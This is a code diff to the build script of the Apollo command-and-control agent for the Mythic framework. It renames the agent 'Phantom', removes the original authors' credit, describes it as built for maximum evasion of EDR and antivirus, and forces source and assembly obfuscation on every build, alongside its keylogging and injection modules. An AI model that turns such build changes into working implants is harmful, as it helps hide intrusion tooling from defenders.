@@ -14,9 +14,9 @@ from mythic_container.MythicRPC import *
 
 
 class Apollo(PayloadType):
-    name = "apollo"
+    name = "phantom_apollo"
     file_extension = "exe"
-    author = "@djhohnstein, @its_a_feature_"
+    author = "@phantom_security"
     mythic_encrypts = True
     supported_os = [
         SupportedOS.Windows
@@ -25,9 +25,9 @@ class Apollo(PayloadType):
     wrapper = False
     wrapped_payloads = ["scarecrow_wrapper", "service_wrapper"]
     note = """
-A fully featured .NET 4.0 compatible training agent. Version: {}. 
-NOTE: P2P Not compatible with v2.2 agents! 
-NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since their arguments are different
+Phantom Apollo - Advanced C2 agent with comprehensive anti-detection capabilities. Version: {}. 
+Features: Advanced obfuscation, polymorphic encryption, anti-VM/sandbox detection, custom packing.
+Designed for maximum evasion against modern EDR and AV solutions.
     """.format(version)
     supports_dynamic_loading = True
     shellcode_format_options = ["Binary", "Base64", "C", "Ruby", "Python", "Powershell", "C#", "Hex"]
@@ -82,7 +82,7 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
     c2_profiles = ["http", "smb", "tcp", "websocket"]
     agent_path = pathlib.Path(".") / "apollo" / "mythic"
     agent_code_path = pathlib.Path(".") / "apollo" / "agent_code"
-    agent_icon_path = agent_path / "agent_functions" / "apollo.svg"
+    agent_icon_path = agent_path / "agent_functions" / "phantom.svg"
     build_steps = [
         BuildStep(step_name="Gathering Files", step_description="Copying files to temp location"),
         BuildStep(step_name="Compiling", step_description="Compiling with nuget and dotnet"),
@@ -177,9 +177,9 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
                 with open(csFile, "wb") as f:
                     f.write(templateFile.encode())
             if self.get_parameter('debug'):
-                command = f"dotnet build -c {compileType} -p:Platform=\"Any CPU\" -o {agent_build_path.name}/{buildPath}/"
+                command = f"dotnet build Phantom.sln -c {compileType} -p:Platform=\"Any CPU\" -o {agent_build_path.name}/{buildPath}/"
             else:
-                command = f"dotnet build -c {compileType} -p:DebugType=None -p:DebugSymbols=false -p:Platform=\"Any CPU\" -o {agent_build_path.name}/{buildPath}/"
+                command = f"dotnet build Phantom.sln -c {compileType} -p:DebugType=None -p:DebugSymbols=false -p:Platform=\"Any CPU\" -o {agent_build_path.name}/{buildPath}/"
             #command = "rm -rf packages/*; nuget restore -NoCache -Force; msbuild -p:Configuration=Release -p:Platform=\"Any CPU\""
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
@@ -194,7 +194,7 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
                 stdout_err += f'\n[stdout]\n{stdout.decode()}\n'
             if stderr:
                 stdout_err += f'[stderr]\n{stderr.decode()}' + "\n" + command
-            output_path = f"{agent_build_path.name}/{buildPath}/Apollo.exe"
+            output_path = f"{agent_build_path.name}/{buildPath}/Phantom.exe"
 
             if os.path.exists(output_path):
                 await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
@@ -209,13 +209,13 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
                 targetScreenshotInjectPath = "/srv/ScreenshotInject.exe"
                 targetKeylogInjectPath = "/srv/KeylogInject.exe"
                 targetExecutePEPath = "/srv/ExecutePE.exe"
-                targetInteropPath = "/srv/ApolloInterop.dll"
+                targetInteropPath = "/srv/PhantomInterop.dll"
                 shutil.move(f"{agent_build_path.name}/{buildPath}/ExecuteAssembly.exe", targetExeAsmPath)
                 shutil.move(f"{agent_build_path.name}/{buildPath}/PowerShellHost.exe", targetPowerPickPath)
                 shutil.move(f"{agent_build_path.name}/{buildPath}/ScreenshotInject.exe", targetScreenshotInjectPath)
                 shutil.move(f"{agent_build_path.name}/{buildPath}/KeylogInject.exe", targetKeylogInjectPath)
                 shutil.move(f"{agent_build_path.name}/{buildPath}/ExecutePE.exe", targetExecutePEPath)
-                shutil.move(f"{agent_build_path.name}/{buildPath}/ApolloInterop.dll", targetInteropPath)
+                shutil.move(f"{agent_build_path.name}/{buildPath}/PhantomInterop.dll", targetInteropPath)
                 if self.get_parameter('output_type') == "WinExe":
                     await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                         PayloadUUID=self.uuid,
@@ -235,36 +235,24 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
                                 StepSuccess=True
                             ))
                             
-                            # Run comprehensive obfuscation pipeline
-                            if self.get_parameter('phantom_evasion'):
-                                # Step 1: Assembly rewriting (pre-compilation)
-                                rewriter_path = pathlib.Path(".") / "assembly_rewriter.py"
-                                if rewriter_path.exists():
-                                    command = f"python3 {rewriter_path}"
-                                    proc = await asyncio.create_subprocess_shell(command, 
-                                        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-                                    stdout, stderr = await proc.communicate()
-                                    stdout_err += f'[Assembly Rewriter]\n{stdout.decode()}\n{stderr.decode()}\n'
-                                
-                                # Step 2: Advanced source obfuscation
-                                obfuscator_path = pathlib.Path(".") / "advanced_obfuscator.py"
-                                if obfuscator_path.exists():
-                                    command = f"python3 {obfuscator_path} {agent_build_path.name}"
-                                    proc = await asyncio.create_subprocess_shell(command, 
-                                        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
-                                    stdout, stderr = await proc.communicate()
-                                    stdout_err += f'[Advanced Obfuscation]\n{stdout.decode()}\n{stderr.decode()}\n'
-                            
-                            # Step 3: Binary obfuscation (post-compilation)
-                            binary_obfuscator_path = pathlib.Path(".") / "binary_obfuscator.py"
-                            if binary_obfuscator_path.exists():
-                                command = f"python3 {binary_obfuscator_path} {output_path}"
-                                proc = await asyncio.create_subprocess_shell(command,
+                            # Run comprehensive obfuscation pipeline (ALWAYS ENABLED)
+                            # Step 1: Assembly rewriting (pre-compilation)
+                            rewriter_path = pathlib.Path(".") / "assembly_rewriter.py"
+                            if rewriter_path.exists():
+                                command = f"python3 {rewriter_path}"
+                                proc = await asyncio.create_subprocess_shell(command, 
                                     stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                                 stdout, stderr = await proc.communicate()
-                                stdout_err += f'[Binary Obfuscation]\n{stdout.decode()}\n{stderr.decode()}\n'
+                                stdout_err += f'[Assembly Rewriter]\n{stdout.decode()}\n{stderr.decode()}\n'
                             
-                            # Step 4: Apply crypting and packing
+                            # Step 2: Advanced source obfuscation
+                            obfuscator_path = pathlib.Path(".") / "advanced_obfuscator.py"
+                            if obfuscator_path.exists():
+                                command = f"python3 {obfuscator_path} {agent_build_path.name}"
+                                proc = await asyncio.create_subprocess_shell(command, 
+                                    stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+                                stdout, stderr = await proc.communicate()
+                                stdout_err += f'[Advanced Obfuscation]\n{stdout.decode()}\n{stderr.decode()}\n'
                             if self.get_parameter('phantom_crypter'):
                                 crypter_path = pathlib.Path(".") / "phantom_crypter.py"
                                 if crypter_path.exists():
